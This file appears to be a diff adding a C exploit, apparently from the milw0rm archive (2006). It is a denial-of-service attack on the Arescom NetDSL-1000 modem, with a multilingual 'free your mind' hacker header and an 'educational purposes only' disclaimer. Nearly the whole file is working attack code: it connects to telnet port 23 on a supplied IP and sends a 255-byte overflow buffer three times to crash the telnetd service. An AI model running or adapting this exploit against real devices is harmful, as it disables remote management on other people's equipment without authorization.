@@ -1,0 +1,103 @@
+/*
+    Do you want to hack? les`t go .. free your mind
+    Tu veux etre un hacker? allez .. if faut libere ta tete!
+    Quieres hackear? dale .. libera tu mente
+    
+    Vulnerabilidad en modem Arescom NetDSL-1000 
+    por un buffer overflow debido < [255] en la pila stack.
+    
+    DoS atack por Fabian Ramirez S. <framirez@akori.fr>	
+						www.framirez.com
+
+
+	  If you flood the telnet configuration a couple dozen times with long
+	strings, eventually the telnetd service flat out dies. Routing functions
+	of the NetDSL continue to work fine as before. It is unknown whether only
+	the telnetd service is affected, other means of remote configuration may
+	have become unavailable as well.
+
+	Remember:   KING
+    
+    Solo para fines educativos! (CREEEEEEO ZEEEEEEEEEEE)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>        
+
+#define PORT 23
+#define MAXDATASIZE 100   
+
+char shellcode[]= "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1\xC0\xC1"
+		  "\x89\x28\x12\x34\xC0\xC1\xC0\xC1\xC0\xC1";
+
+int main(int argc, char *argv[])
+{
+   int fd, numbytes,i;
+   char buf[MAXDATASIZE];  
+   struct hostent *he;         
+   struct sockaddr_in server;  
+
+   printf("Exploit Arescom NetDSL-1000 executing\n");
+   printf ("	 		  by framirez\n");
+   
+   if (argc !=2) { 
+      printf("Uso: %s <Dirección IP>\n",argv[0]);
+      exit(-1);
+   }
+
+
+    
+   if ((he=gethostbyname(argv[1]))==NULL){       
+      printf("gethostbyname() error\n");
+      exit(-1);
+   }
+
+   if ((fd=socket(AF_INET, SOCK_STREAM, 0))==-1){  
+      printf("socket() error\n");
+      exit(-1);
+   }
+
+   server.sin_family = AF_INET;
+   server.sin_port = htons(PORT); 
+   server.sin_addr = *((struct in_addr *)he->h_addr);  
+
+   if(connect(fd, (struct sockaddr *)&server,
+      sizeof(struct sockaddr))==-1){ 
+      printf("ERROR conectando al host\n");
+      exit(-1);
+   }
+      
+    for (i=0;i<3;i++)
+    {
+    send(fd,shellcode,255,0);
+    }
+    
+    printf ("Exploit enviado con EXITO al destinatario\n");
+    printf ("				   by framirez\n");
+
+   close(fd); 
+
+  return 1;
+}
+
+// milw0rm.com [2006-02-02]
